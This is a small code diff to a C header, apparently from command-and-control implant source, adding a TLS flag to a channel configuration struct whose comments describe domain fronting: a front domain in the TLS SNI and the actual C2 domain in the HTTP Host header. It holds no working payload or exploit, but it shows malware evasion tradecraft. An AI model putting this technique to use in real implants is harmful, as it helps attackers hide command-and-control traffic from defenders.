@@ -60,6 +60,7 @@ typedef struct _CHANNEL_CONFIG {
     /* ClientHello uses sni_domain while HTTP Host uses host_domain.    */
     char   sni_domain[256];  /* TLS SNI value (front domain)          */
     char   host_domain[256]; /* HTTP Host header (actual C2 domain)   */
+    DWORD  needs_tls;        /* TRUE if channel URL uses https://     */
 } CHANNEL_CONFIG;
 
 /* ------------------------------------------------------------------ */
